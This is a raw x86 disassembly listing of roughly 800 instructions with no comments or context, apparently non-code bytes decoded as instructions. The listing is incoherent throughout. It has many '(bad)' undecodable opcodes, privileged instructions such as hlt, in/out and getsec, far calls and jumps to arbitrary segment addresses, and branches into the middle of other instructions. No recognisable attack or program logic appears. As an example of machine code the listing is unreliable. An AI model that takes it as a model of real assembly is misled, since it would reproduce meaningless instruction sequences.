  6b1670:	(bad)  
  6b1671:	call   0x5532:0xb5a861e3
  6b1678:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  6b1679:	shl    DWORD PTR [eax-0x12],1
  6b167c:	imul   ecx,DWORD PTR [ebx-0x7f],0xffffffc8
  6b1680:	push   edi
  6b1681:	call   0x8663:0x3372bec1
  6b1688:	bound  ecx,QWORD PTR [ebx+ecx*8+0x2e072048]
  6b168f:	retf   0xa509
  6b1692:	jb     0x6b1636
  6b1694:	pop    ebp
  6b1695:	lods   eax,DWORD PTR ds:[esi]
  6b1696:	jecxz  0x6b163f
  6b1698:	adc    eax,0x23697c16
  6b169d:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  6b169f:	lea    esi,[ebp-0x4fb94c8]
  6b16a5:	push   ebx
  6b16a6:	clc    
  6b16a7:	int    0xb0
  6b16a9:	mov    al,0xae
  6b16ab:	sbb    BYTE PTR ds:0x8a8ee5ff,al
  6b16b1:	xor    al,0x51
  6b16b3:	dec    ebx
  6b16b4:	add    DWORD PTR [esi+eax*4],edx
  6b16b7:	pop    ebp
  6b16b8:	repnz cli 
  6b16ba:	ror    BYTE PTR [edi-0x2f728f14],1
  6b16c0:	(bad)  
  6b16c1:	mov    edx,DWORD PTR ss:[esi+eax*2+0x5f]
  6b16c6:	ja     0x6b1707
  6b16c8:	or     ecx,edx
  6b16ca:	push   esi
  6b16cb:	sub    al,0x8a
  6b16cd:	and    ebp,DWORD PTR [ebx+0x46a18857]
  6b16d3:	sub    eax,0xde188916
  6b16d8:	(bad)  
  6b16d9:	js     0x6b1705
  6b16db:	sbb    al,BYTE PTR [edi-0x24]
  6b16de:	sub    eax,0x7a5645ff
  6b16e3:	xchg   DWORD PTR [ebx+edx*2],ecx
  6b16e6:	mov    ds:0x8f1b46d,eax
  6b16eb:	dec    BYTE PTR [ecx]
  6b16ed:	(bad)  
  6b16ee:	ds fmulp st(6),st
  6b16f1:	cmp    ebx,DWORD PTR [edx+0x13db0ada]
  6b16f7:	sub    DWORD PTR [edi-0x66d94885],ebp
  6b16fd:	test   DWORD PTR [edx+ebp*1-0x41248133],ecx
  6b1704:	xor    DWORD PTR [eax-0x3e56ad81],esi
  6b170a:	rcr    DWORD PTR [ebp-0x2c6f127a],0xac
  6b1711:	aad    0x49
  6b1713:	mov    bl,0x72
  6b1715:	xor    bh,BYTE PTR [esi-0x4d99a5b]
  6b171b:	outs   dx,BYTE PTR ds:[esi]
  6b171c:	rcr    DWORD PTR [ebp+0xdf437c7],1
  6b1722:	sahf   
  6b1723:	hlt    
  6b1724:	cld    
  6b1725:	lea    esi,[ebx]
  6b1727:	(bad)  
  6b1728:	jp     0x6b174d
  6b172a:	fidiv  DWORD PTR [ebx-0x68]
  6b172d:	dec    eax
  6b172e:	arpl   WORD PTR [ecx+0xc9a8701],bx
  6b1734:	pop    eax
  6b1735:	cld    
  6b1736:	loop   0x6b16ba
  6b1738:	inc    esi
  6b1739:	pop    esp
  6b173a:	adc    DWORD PTR [esi],ebx
  6b173c:	inc    edi
  6b173d:	scas   al,BYTE PTR es:[edi]
  6b173e:	cmp    BYTE PTR [si],0xa8
  6b1742:	or     DWORD PTR [ecx-0x16],ecx
  6b1745:	push   esi
  6b1746:	mul    BYTE PTR [edi]
  6b1748:	adc    ch,ch
  6b174a:	mov    ch,0x30
  6b174c:	lea    ebp,[edi-0x494b29a5]
  6b1752:	cld    
  6b1753:	getsec 
  6b1755:	jns    0x6b1730
  6b1757:	push   ebp
  6b1758:	or     DWORD PTR [eax+0x3c],0xffffffb7
  6b175c:	gs je  0x6b1788
  6b175f:	and    al,0x96
  6b1761:	cmp    ecx,DWORD PTR [esi-0x253bd756]
  6b1767:	jno    0x6b17bf
  6b1769:	jl     0x6b1765
  6b176b:	ficom  WORD PTR [edi]
  6b176d:	daa    
  6b176e:	in     eax,dx
  6b176f:	or     ecx,ebx
  6b1771:	jnp    0x6b179d
  6b1773:	add    ebp,DWORD PTR [esi]
  6b1775:	stos   BYTE PTR es:[edi],al
  6b1776:	(bad)  
  6b1777:	jl     0x6b1784
  6b1779:	sti    
  6b177a:	or     DWORD PTR [esi],0x64b6afac
  6b1780:	jl     0x6b17a9
  6b1782:	inc    ebp
  6b1783:	(bad)  [ecx+0x1a]
  6b1786:	cmp    BYTE PTR [ecx],cl
  6b1788:	mov    ebp,0x15a5987d
  6b178d:	(bad)  
  6b178e:	and    DWORD PTR [edi],eax
  6b1790:	inc    eax
  6b1791:	jmp    0x2f:0xe6e4d9b4
  6b1798:	cld    
  6b1799:	inc    esi
  6b179a:	jle    0x6b1817
  6b179c:	and    ebx,edx
  6b179e:	into   
  6b179f:	pop    esp
  6b17a0:	xor    ebp,DWORD PTR [eax-0x1a]
  6b17a3:	xchg   esp,eax
  6b17a4:	add    al,0xa4
  6b17a6:	fstp   DWORD PTR [eax-0x61]
  6b17a9:	adc    BYTE PTR [eax-0x6],0x76
  6b17ad:	int3   
  6b17ae:	ret    0xd0e8
  6b17b1:	jmp    0x4dd22beb
  6b17b6:	dec    ebx
  6b17b7:	sbb    eax,0x39d1b84
  6b17bc:	inc    eax
  6b17bd:	jg     0x6b1743
  6b17bf:	fiadd  WORD PTR [edx]
  6b17c1:	sub    eax,0xb7ab3767
  6b17c6:	cmp    eax,DWORD PTR [edi+0x26]
  6b17c9:	or     eax,0x8db0236b
  6b17ce:	or     al,BYTE PTR [ebp+edi*1-0x56605726]
  6b17d5:	mov    bh,0xc9
  6b17d7:	rol    DWORD PTR [esi],1
  6b17d9:	retf   
  6b17da:	hlt    
  6b17db:	arpl   sp,bp
  6b17dd:	jp     0x6b17e5
  6b17df:	(bad)  
  6b17e0:	jbe    0x6b17d6
  6b17e2:	push   0xffffffa7
  6b17e4:	ficomp WORD PTR [ebx]
  6b17e6:	mov    ds:0xedf4200,al
  6b17eb:	inc    eax
  6b17ec:	fisubr WORD PTR [ecx+ebp*4+0x5e]
  6b17f0:	(bad)
  6b17f3:	push   ss
  6b17f4:	mov    eax,0xa3bd103c
  6b17f9:	and    esi,DWORD PTR [esi]
  6b17fb:	out    dx,al
  6b17fc:	test   edx,esp
  6b17fe:	dec    ebx
  6b17ff:	ds int 0x79
  6b1802:	mov    WORD PTR [ecx-0x2855c910],cs
  6b1808:	jo     0x6b1816
  6b180a:	cli    
  6b180b:	jp     0x6b17a8
  6b180d:	arpl   WORD PTR [ebx],ax
  6b180f:	sar    DWORD PTR [ecx+edx*2+0x1982057],1
  6b1816:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  6b1817:	jmp    0xb199a41a
  6b181c:	inc    edi
  6b181d:	stos   DWORD PTR es:[edi],eax
  6b181e:	scas   al,BYTE PTR es:[edi]
  6b181f:	popa   
  6b1820:	dec    eax
  6b1821:	in     al,0x57
  6b1823:	adc    ch,cl
  6b1825:	scas   eax,DWORD PTR es:[edi]
  6b1826:	pop    ebx
  6b1827:	and    dh,dh
  6b1829:	loop   0x6b185e
  6b182b:	jg     0x6b17ed
  6b182d:	push   eax
  6b182e:	adc    bh,BYTE PTR [ebp+0x62]
  6b1831:	arpl   bx,bp
  6b1833:	adc    esp,eax
  6b1835:	pop    edx
  6b1836:	mov    eax,0xa639a6f9
  6b183b:	stos   BYTE PTR es:[edi],al
  6b183c:	mov    ds:0xd1845759,eax
  6b1841:	hlt    
  6b1842:	xchg   esp,eax
  6b1843:	xlat   BYTE PTR ds:[ebx]
  6b1844:	sbb    eax,DWORD PTR [ebx-0x26]
  6b1847:	mov    ds:0xd076b40a,al
  6b184c:	mov    ch,0xcb
  6b184e:	mov    cl,0x55
  6b1850:	shl    BYTE PTR [ecx-0x77c99205],cl
  6b1856:	pop    ebp
  6b1857:	jnp    0x6b181e
  6b1859:	jnp    0x6b18a8
  6b185b:	pop    ebp
  6b185c:	inc    esi
  6b185d:	inc    esi
  6b185e:	cmp    BYTE PTR [edi+0x4faff2ef],ah
  6b1864:	test   eax,0x8c4b9618
  6b1869:	xchg   edi,eax
  6b186a:	sar    BYTE PTR [ebx-0x48],1
  6b186d:	push   ecx
  6b186e:	push   esi
  6b186f:	mov    edx,0x96bca9d0
  6b1874:	dec    ebp
  6b1875:	ret    
  6b1876:	shr    ah,0x2c
  6b1879:	pop    ds
  6b187a:	imul   ebp,DWORD PTR [eax+0x33bf9d00],0xffffffdf
  6b1881:	popa   
  6b1882:	in     eax,0xd1
  6b1884:	sub    cl,dl
  6b1886:	mov    ah,0x24
  6b1888:	sub    bl,BYTE PTR [ebx]
  6b188a:	and    al,0xfc
  6b188c:	add    cl,BYTE PTR [esi]
  6b188e:	push   edi
  6b188f:	aad    0xa0
  6b1891:	mov    eax,0xb404a508
  6b1896:	cmp    ebx,DWORD PTR [edx+0x14]
  6b1899:	push   eax
  6b189a:	sub    eax,0x42ce4607
  6b189f:	arpl   WORD PTR ds:0x72f80aa5,cx
  6b18a5:	xchg   esi,eax
  6b18a6:	or     dh,BYTE PTR [edx-0x6dc82b2]
  6b18ac:	jmp    0xeba8:0x9a6a4739
  6b18b3:	pop    ecx
  6b18b4:	popa   
  6b18b5:	aaa    
  6b18b6:	xchg   edx,eax
  6b18b7:	xchg   esp,eax
  6b18b8:	sbb    edx,DWORD PTR [ebp-0x1a15f55b]
  6b18be:	cmp    edi,edi
  6b18c0:	and    ch,BYTE PTR [ebp-0x65ade539]
  6b18c6:	push   esp
  6b18c7:	loopne 0x6b1879
  6b18c9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  6b18ca:	(bad)  
  6b18cc:	sub    ch,dh
  6b18ce:	dec    esi
  6b18cf:	sahf   
  6b18d0:	(bad)  
  6b18d1:	mov    cs,ecx
  6b18d3:	jno    0x6b193a
  6b18d5:	sub    ah,BYTE PTR ds:0x4721edd3
  6b18db:	mov    esi,0x93443470
  6b18e0:	push   ebx
  6b18e1:	jnp    0x6b1953
  6b18e3:	pusha  
  6b18e4:	mov    bh,0xc6
  6b18e6:	je     0x6b192e
  6b18e8:	das    
  6b18e9:	retf   0xf44a
  6b18ec:	xor    eax,0x86d0d6e8
  6b18f1:	enter  0xc81c,0xdc
  6b18f5:	push   ecx
  6b18f6:	jo     0x6b1879
  6b18f8:	jae    0x6b1944
  6b18fa:	mov    ah,0x34
  6b18fc:	fnstsw WORD PTR [esi]
  6b18fe:	pop    ecx
  6b18ff:	xchg   BYTE PTR [edx-0x36],ah
  6b1902:	pop    ss
  6b1903:	call   0x4f239564
  6b1908:	xchg   esi,eax
  6b1909:	push   ebx
  6b190a:	or     ecx,edx
  6b190c:	jne    0x6b18e8
  6b190e:	xchg   ebx,eax
  6b190f:	call   0xa20697bb
  6b1914:	fstp   TBYTE PTR [ebx-0x170652fa]
  6b191a:	lock push cs
  6b191c:	adc    eax,0xd61d1614
  6b1921:	bound  esp,QWORD PTR [ebx-0x649d594e]
  6b1927:	mov    dl,0x81
  6b1929:	pop    esp
  6b192a:	adc    DWORD PTR [edi],ebx
  6b192c:	pop    esp
  6b192d:	(bad)  
  6b192e:	lods   eax,DWORD PTR ds:[esi]
  6b192f:	mov    BYTE PTR [eax],dl
  6b1931:	pop    edi
  6b1932:	imul   BYTE PTR [esi+0x79f45c52]
  6b1938:	pushf  
  6b1939:	adc    BYTE PTR ds:0x4461b6ab,dh
  6b193f:	stos   DWORD PTR es:[edi],eax
  6b1940:	sub    al,0x0
  6b1942:	and    BYTE PTR [edi+0x55],bh
  6b1945:	mov    ebx,0xee55000c
  6b194a:	enter  0x3efc,0x7d
  6b194e:	and    eax,0x72242106
  6b1953:	call   0xe8d6:0x743e1df3
  6b195a:	mov    esp,gs
  6b195c:	mov    eax,0x700a624a
  6b1961:	scas   al,BYTE PTR es:[edi]
  6b1962:	sub    edi,DWORD PTR [eax-0x1eb5617f]
  6b1968:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  6b1969:	pop    ss
  6b196a:	sbb    DWORD PTR [eax],0x1ff84311
  6b1970:	punpcklwd mm7,DWORD PTR [ebx+0x46]
  6b1974:	test   al,0x79
  6b1976:	in     al,dx
  6b1977:	mov    DWORD PTR [esi-0x70],ecx
  6b197a:	push   ss
  6b197b:	lahf   
  6b197c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  6b197d:	in     eax,0x7c
  6b197f:	cmp    eax,DWORD PTR [esi-0x54bf7705]
  6b1985:	mov    BYTE PTR [ebx],bl
  6b1987:	xchg   ecx,eax
  6b1988:	jae    0x6b19a0
  6b198a:	mov    esi,0x5b9620e5
  6b198f:	inc    ebp
  6b1990:	(bad)  
  6b1992:	fisttp WORD PTR [ecx+esi*4-0x57]
  6b1996:	xlat   BYTE PTR ds:[ebx]
  6b1997:	and    eax,edx
  6b1999:	(bad)  
  6b199a:	repnz inc eax
  6b199c:	inc    edx
  6b199d:	mov    edx,0x92f344ec
  6b19a2:	add    ecx,DWORD PTR [ecx+0x4e40dcf9]
  6b19a8:	mov    esi,0x8bfe30ca
  6b19ad:	sub    esp,0xffffffa6
  6b19b0:	xchg   edi,eax
  6b19b1:	loop   0x6b196e
  6b19b3:	pop    ebx
  6b19b4:	outs   dx,DWORD PTR ds:[esi]
  6b19b5:	push   edx
  6b19b6:	enter  0x3639,0x11
  6b19ba:	ret    0x74d8
  6b19bd:	jae    0x6b196b
  6b19bf:	pop    ds
  6b19c0:	idiv   DWORD PTR [ebx]
  6b19c2:	push   eax
  6b19c3:	jnp    0x6b1981
  6b19c5:	xor    al,BYTE PTR [ecx]
  6b19c7:	mov    DWORD PTR [edi+0x69],ebx
  6b19ca:	jb     0x6b19cf
  6b19cc:	popf   
  6b19cd:	stc    
  6b19ce:	in     eax,0x28
  6b19d0:	sbb    al,0x4
  6b19d2:	inc    ebp
  6b19d3:	js     0x6b19f2
  6b19d5:	sti    
  6b19d6:	jbe    0x6b1a55
  6b19d8:	push   eax
  6b19d9:	repnz int 0x2d
  6b19dc:	mov    edi,DWORD PTR ds:0x7554213f
  6b19e2:	sub    ah,al
  6b19e4:	icebp  
  6b19e5:	(bad)  
  6b19e6:	xchg   esi,eax
  6b19e7:	repz retf 
  6b19e9:	xchg   ebx,eax
  6b19ea:	pop    edi
  6b19eb:	mov    esi,0x5fefe32d
  6b19f0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  6b19f1:	ja     0x6b197a
  6b19f3:	pop    ebx
  6b19f4:	and    DWORD PTR [ecx+edi*1-0x65],edx
  6b19f8:	xchg   ebx,eax
  6b19f9:	and    BYTE PTR ds:0x9e8bd7ff,al
  6b19ff:	jmp    0xb273:0x1cd3903f
  6b1a06:	or     DWORD PTR [ebp+0x62],ecx
  6b1a09:	stos   BYTE PTR es:[edi],al
  6b1a0a:	lods   al,BYTE PTR ds:[esi]
  6b1a0b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  6b1a0c:	rol    BYTE PTR [eax-0x18],cl
  6b1a0f:	jb     0x6b1a13
  6b1a11:	sub    ecx,DWORD PTR [edx]
  6b1a13:	push   ss
  6b1a14:	cmp    esp,ebx
  6b1a16:	data16 mov cl,0xda
  6b1a19:	push   ss
  6b1a1a:	les    esi,FWORD PTR [ecx]
  6b1a1c:	push   es
  6b1a1d:	call   0xdca4d4bb
  6b1a22:	jne    0x6b1a6a
  6b1a24:	mov    ebx,0x3bff0e76
  6b1a29:	inc    ebp
  6b1a2a:	loop   0x6b1a9c
  6b1a2c:	dec    edx
  6b1a2d:	sbb    al,0x38
  6b1a2f:	sbb    eax,DWORD PTR [edx-0x327cacf9]
  6b1a35:	ins    DWORD PTR es:[edi],dx
  6b1a36:	mov    WORD PTR [ecx+ecx*1+0x1e],cs
  6b1a3a:	or     bh,dh
  6b1a3c:	dec    edi
  6b1a3d:	push   0xbc4e82ff
  6b1a42:	daa    
  6b1a43:	(bad)  
  6b1a44:	mov    bl,ch
  6b1a46:	cmp    esp,DWORD PTR [ecx+0x56820126]
  6b1a4c:	aaa    
  6b1a4d:	rcr    DWORD PTR [esi],cl
  6b1a4f:	int    0x6c
  6b1a51:	sbb    eax,0xd510296c
  6b1a56:	dec    ebp
  6b1a57:	adc    al,0x80
  6b1a59:	mov    eax,0x3cddb35a
  6b1a5e:	repz loopne 0x6b19ee
  6b1a61:	aam    0x8a
  6b1a63:	arpl   WORD PTR [edx+0x19dc204e],dx
  6b1a69:	into   
  6b1a6a:	stc    
  6b1a6b:	pop    es
  6b1a6c:	xchg   bl,ch
  6b1a6e:	push   edi
  6b1a6f:	sbb    cl,bl
  6b1a71:	ret    0x3d1c
  6b1a74:	lahf   
  6b1a75:	xchg   edi,eax
  6b1a76:	and    eax,0x54bd9e37
  6b1a7b:	xchg   ebp,eax
  6b1a7c:	add    DWORD PTR [ecx-0x4bcf8200],ebp
  6b1a82:	inc    esi
  6b1a83:	sub    cl,BYTE PTR [eax-0x74]
  6b1a86:	test   DWORD PTR [edi],esp
  6b1a88:	xchg   ebp,eax
  6b1a89:	inc    ebx
  6b1a8a:	leave  
  6b1a8b:	jle    0x6b1ad1
  6b1a8d:	imul   esi,DWORD PTR [esi-0x49830fa6],0xffffff92
  6b1a94:	pop    eax
  6b1a95:	out    dx,eax
  6b1a96:	out    0xbc,eax
  6b1a98:	or     al,0xc3
  6b1a9a:	enter  0xd8fb,0xe0
  6b1a9e:	into   
  6b1a9f:	out    dx,al
  6b1aa0:	ret    0x5208
  6b1aa3:	cmp    al,0x99
  6b1aa5:	arpl   WORD PTR [edi+esi*4],cx
  6b1aa8:	or     edi,DWORD PTR [ebp+0x1e]
  6b1aab:	push   ebx
  6b1aac:	sub    eax,0x94900a81
  6b1ab1:	call   0xed252c4e
  6b1ab6:	and    ah,ch
  6b1ab8:	sub    esi,esi
  6b1aba:	mov    bl,0xe0
  6b1abc:	add    bh,BYTE PTR [esi+0x4d]
  6b1abf:	mov    edx,0x9c8587fa
  6b1ac4:	sbb    eax,0xe8ba1f4d
  6b1ac9:	out    dx,eax
  6b1aca:	arpl   WORD PTR [ecx],ax
  6b1acc:	int3   
  6b1acd:	mov    eax,0x6e4855cc
  6b1ad2:	dec    eax
  6b1ad3:	mov    esp,0x1f3af870
  6b1ad8:	push   eax
  6b1ad9:	sbb    al,0x8d
  6b1adb:	xor    ah,BYTE PTR [ecx]
  6b1add:	daa    
  6b1ade:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  6b1adf:	out    0x31,al
  6b1ae1:	inc    ebp
  6b1ae2:	mov    ebx,0x83aa079c
  6b1ae7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  6b1ae8:	add    DWORD PTR [ebx-0x75473de8],esi
  6b1aee:	scas   eax,DWORD PTR es:[edi]
  6b1aef:	dec    eax
  6b1af0:	fwait
  6b1af1:	test   eax,0xbff7fdce
  6b1af6:	push   0x2346c6a7
  6b1afb:	test   al,0x28
  6b1afd:	pop    ds
  6b1afe:	call   0x8cb491f0
  6b1b03:	mov    cl,0x4e
  6b1b05:	arpl   WORD PTR [ecx],si
  6b1b07:	and    ax,0x98fe
  6b1b0b:	cdq    
  6b1b0c:	inc    esp
  6b1b0d:	jne    0x6b1ae0
  6b1b0f:	pop    esi
  6b1b10:	test   DWORD PTR [esi-0x72],0x7271713b
  6b1b17:	addr16 and eax,0x4e7cee76
  6b1b1d:	xchg   BYTE PTR [ecx+0x74],cl
  6b1b20:	xor    al,0x2f
  6b1b22:	push   ss
  6b1b23:	imul   edx,ebx,0x1d1cbbb6
  6b1b29:	(bad)  
  6b1b2a:	cmp    dh,BYTE PTR [esi]
  6b1b2c:	popa   
  6b1b2d:	mov    bl,dl
  6b1b2f:	loop   0x6b1ade
  6b1b31:	add    ah,BYTE PTR [ebp+0x7a6e74ac]
  6b1b37:	add    ebx,esp
  6b1b39:	add    BYTE PTR [ecx-0x3f],dl
  6b1b3c:	mov    al,0x4a
  6b1b3e:	xor    eax,0x39093dd5
  6b1b43:	mov    BYTE PTR [ebx+0x571cbda0],ch
  6b1b49:	xchg   edi,eax
  6b1b4a:	jae    0x6b1b29
  6b1b4c:	jl     0x6b1b7c
  6b1b4e:	cmc    
  6b1b4f:	retf   
  6b1b50:	xchg   ebx,eax
  6b1b51:	cmc    
  6b1b52:	popf   
  6b1b53:	pop    edx
  6b1b54:	cmp    BYTE PTR [ebx-0x1747bee8],bh
  6b1b5a:	sar    DWORD PTR [esi+0x7b],0xbd
  6b1b5e:	das    
  6b1b5f:	push   0xa86544a4
  6b1b64:	sub    ebx,0x3c
  6b1b67:	jbe    0x6b1bd8
  6b1b69:	out    dx,eax
  6b1b6a:	mov    ecx,0x9f4cec4a
  6b1b6f:	or     al,0x46
  6b1b71:	dec    edx
  6b1b72:	push   edi
  6b1b73:	fdivr  QWORD PTR ds:[esi+0x3d18751c]
  6b1b7a:	mov    es,edx
  6b1b7c:	xchg   esi,eax
  6b1b7d:	imul   eax,ebp,0x6d990f1f
  6b1b83:	fst    QWORD PTR [eax+0x21]
  6b1b86:	es jecxz 0x6b1b36
  6b1b89:	clc    
  6b1b8a:	xchg   BYTE PTR ds:0xc80391dd,dh
  6b1b90:	mov    edi,0x62341c4b
  6b1b95:	cmp    edi,DWORD PTR [esi+0x28]
  6b1b98:	(bad)  [edi-0x5bceb8da]
  6b1b9e:	in     al,0x2d
  6b1ba0:	push   0x17
  6b1ba2:	(bad)  
  6b1ba3:	push   esp
  6b1ba4:	sbb    eax,0x535fec0e
  6b1ba9:	ror    BYTE PTR [esi-0x79],0xa0
  6b1bad:	mov    ds:0x53bf1824,eax
  6b1bb2:	adc    DWORD PTR [edx],edx
  6b1bb4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  6b1bb5:	sbb    al,0xe9
  6b1bb7:	mov    ch,0x41
  6b1bb9:	cmp    BYTE PTR [edx-0x504bb368],bl
  6b1bbf:	retf   0xc55d
  6b1bc2:	pop    ecx
  6b1bc3:	mov    ds:0x24b27e1c,eax
  6b1bc8:	repnz xchg ecx,eax
  6b1bca:	and    BYTE PTR [edi+eax*1],0xc6
  6b1bce:	adc    bh,BYTE PTR [ebp+eiz*8-0x2b73c7ed]
  6b1bd5:	ret    
  6b1bd6:	repnz mov ch,0xde
  6b1bd9:	aaa    
  6b1bda:	fmul   QWORD PTR [eax+0x6]
  6b1bdd:	aam    0xc8
  6b1bdf:	cld    
  6b1be0:	mov    ah,0xbd
  6b1be2:	dec    eax
  6b1be3:	and    al,0x5a
  6b1be5:	adc    ebx,DWORD PTR [edi]
  6b1be7:	shr    BYTE PTR [eax+edi*2+0x5f75addb],0xed
  6b1bef:	shl    eax,0x15
  6b1bf2:	jecxz  0x6b1bf8
  6b1bf4:	popf   
  6b1bf5:	test   DWORD PTR [ebp+0x3c],edx
  6b1bf8:	pop    ecx
  6b1bf9:	push   eax
  6b1bfa:	jl     0x6b1c79
  6b1bfc:	adc    edi,DWORD PTR [esi]
  6b1bfe:	push   0x81807e27
  6b1c03:	mov    WORD PTR [ebx+edi*1+0x67e4e624],ss
  6b1c0a:	in     eax,dx
  6b1c0b:	mov    ch,0xc6
  6b1c0d:	lahf   
  6b1c0e:	jns    0x6b1ba7
  6b1c10:	xor    DWORD PTR [edx],0xfffffff9
  6b1c13:	(bad)  
  6b1c14:	fdivr  st(2),st
  6b1c16:	in     al,dx
  6b1c17:	out    0x7a,eax
  6b1c19:	add    eax,esp
  6b1c1b:	dec    edx
  6b1c1c:	push   edi
  6b1c1d:	sub    DWORD PTR [edx+eax*2+0x30c2b211],0x2cfd0c27
  6b1c28:	in     al,dx
  6b1c29:	inc    ebx
  6b1c2a:	sub    ch,cl
  6b1c2c:	mov    dl,0x9c
  6b1c2e:	or     BYTE PTR [edi+0x590521ff],ch
  6b1c34:	int3   
  6b1c35:	add    DWORD PTR [edi+0x4379884f],0xb
  6b1c3c:	xlat   BYTE PTR ds:[ebx]
  6b1c3d:	mov    ebp,0x868058e3
  6b1c42:	or     ch,BYTE PTR [eax-0x378f0264]
  6b1c48:	jecxz  0x6b1c87
  6b1c4a:	mov    cl,0x4b
  6b1c4c:	mov    eax,0x540fd334
  6b1c51:	lods   al,BYTE PTR ds:[esi]
  6b1c52:	or     DWORD PTR [eax],ebp
  6b1c54:	mov    esp,0x7547df08
  6b1c59:	shr    BYTE PTR [edi+edx*8-0x43c66f3],1
  6b1c60:	ins    DWORD PTR es:[edi],dx
  6b1c61:	xchg   edi,eax
  6b1c62:	leave  
  6b1c63:	lds    edx,FWORD PTR [ecx-0x7e775219]
  6b1c69:	pop    edx
  6b1c6a:	dec    esi
  6b1c6b:	sar    BYTE PTR [eax-0x15],cl
  6b1c6e:	or     al,0x75
  6b1c70:	or     ebp,DWORD PTR [ebx]
  6b1c72:	imul   edi,DWORD PTR [ebp+eax*4-0x77be405e],0x3d
  6b1c7a:	sar    BYTE PTR [edi+0x1b],0x48
  6b1c7e:	rcl    bh,0xd
  6b1c81:	iret   
  6b1c82:	std    
  6b1c83:	adc    bh,BYTE PTR [esi]
  6b1c85:	add    al,0x31
  6b1c87:	repnz mov ah,0x26
  6b1c8a:	mov    al,0x3b
  6b1c8c:	xchg   ebp,eax
  6b1c8d:	jge    0x6b1cc7
  6b1c8f:	ja     0x6b1d07
  6b1c91:	mov    eax,ds:0xfe92d65d
  6b1c96:	test   BYTE PTR [ebx],0x0
  6b1c99:	jecxz  0x6b1cea
  6b1c9b:	sub    BYTE PTR [ecx+0x5a],bl
  6b1c9e:	pop    ebx
  6b1c9f:	aad    0x20
  6b1ca1:	cmp    BYTE PTR ds:0x8e4e67eb,cl
  6b1ca7:	add    al,0x7e
  6b1ca9:	inc    ebx
  6b1caa:	pop    DWORD PTR [ecx-0x2dc6b28d]
  6b1cb0:	retf   
  6b1cb1:	add    DWORD PTR [esp+ecx*1-0x55],edi
  6b1cb5:	pop    ebx
  6b1cb6:	outs   dx,DWORD PTR ds:[esi]
  6b1cb7:	mov    ds:0xe5724666,eax
  6b1cbc:	mov    bh,0xd5
  6b1cbe:	jle    0x6b1cc2
  6b1cc0:	sbb    ch,BYTE PTR [esi]
  6b1cc2:	cmp    eax,0xfa7aad21
  6b1cc7:	test   al,0xce
  6b1cc9:	rcl    DWORD PTR [ecx-0x728117fe],1
  6b1ccf:	xchg   ecx,eax
  6b1cd0:	mov    ch,0xb9
  6b1cd2:	jbe    0x6b1cf6
  6b1cd4:	and    al,0xd3
  6b1cd6:	xchg   ecx,eax
  6b1cd7:	aad    0xb6
  6b1cd9:	push   cs
  6b1cda:	sub    al,0xb0
  6b1cdc:	lds    esp,FWORD PTR [ebx-0x5d5941b]
  6b1ce2:	ins    BYTE PTR es:[edi],dx
  6b1ce3:	pop    ebx
  6b1ce4:	sub    ecx,DWORD PTR [edi]
  6b1ce6:	jge    0x6b1d19
  6b1ce8:	adc    eax,0xb855a022
  6b1ced:	jo     0x6b1cb2
  6b1cef:	cld    
  6b1cf0:	adc    DWORD PTR [edi],eax
  6b1cf2:	arpl   di,di
  6b1cf4:	cmp    bl,dh
  6b1cf6:	lock ret 0xf931
  6b1cfa:	(bad)  
  6b1cfb:	jp     0x6b1d47
  6b1cfd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  6b1cfe:	fadd   st(4),st
  6b1d00:	test   al,0x60
  6b1d02:	das    
  6b1d03:	dec    ebx
  6b1d04:	jmp    0xdb5c8518
  6b1d09:	mov    ds:0x54fe7e76,eax
  6b1d0e:	mov    cl,0x7c
  6b1d10:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  6b1d11:	(bad)  
  6b1d12:	loope  0x6b1d35
  6b1d14:	out    0x9f,al
  6b1d16:	sbb    ebp,DWORD PTR [edx]
  6b1d18:	mov    ebp,0x5cf0bd20
  6b1d1d:	xor    dh,BYTE PTR [ecx-0x61759445]
  6b1d23:	jmp    0x6b1cd0
  6b1d25:	push   esi
  6b1d26:	jl     0x6b1cf6
  6b1d28:	inc    esi
  6b1d29:	jbe    0x6b1d26
  6b1d2b:	mov    bh,0x7f
  6b1d2d:	and    eax,0x70417410
  6b1d32:	sbb    ecx,esp
  6b1d34:	cmp    al,BYTE PTR [ecx-0x31]
  6b1d37:	mov    bh,0x85
  6b1d39:	jle    0x6b1d08
  6b1d3b:	xor    bh,BYTE PTR [ebx+0xecf01a4]
  6b1d41:	clc    
  6b1d42:	add    bh,cl
  6b1d44:	mov    edx,0x418740c8
  6b1d49:	sub    BYTE PTR [edx-0x6913d6f],cl
  6b1d4f:	jns    0x6b1cd5
  6b1d51:	mov    bl,0x4d
  6b1d53:	stos   BYTE PTR es:[edi],al
  6b1d54:	jbe    0x6b1dbc
  6b1d56:	(bad)  
  6b1d57:	fild   DWORD PTR [ebx-0x55]
  6b1d5a:	jmp    0x6b1d09
  6b1d5c:	cli    
  6b1d5d:	cmp    al,0x7e
  6b1d5f:	shl    BYTE PTR [ecx+0x501376cf],0xfa
  6b1d66:	and    al,0xfc
  6b1d68:	out    dx,eax
  6b1d69:	cwde   
  6b1d6a:	sbb    esp,DWORD PTR [esi-0x7968cf52]
  6b1d70:	outs   dx,BYTE PTR ds:[esi]
  6b1d71:	outs   dx,DWORD PTR ds:[esi]
  6b1d72:	test   al,0x4c
  6b1d74:	hlt    
  6b1d75:	sbb    BYTE PTR [eax+0x57],0xcd
  6b1d79:	xchg   ecx,eax
  6b1d7a:	call   0x8f728812
  6b1d7f:	and    dl,bl
  6b1d81:	pushf  
  6b1d82:	cmp    edx,edi
  6b1d84:	in     al,0xd6
  6b1d86:	jle    0x6b1da9
  6b1d88:	or     edx,ecx
  6b1d8a:	push   ebp
  6b1d8b:	js     0x6b1dd3
  6b1d8d:	fs inc eax
  6b1d8f:	adc    edx,esi
  6b1d91:	sub    al,0x87
  6b1d93:	jmp    0x6b1da3
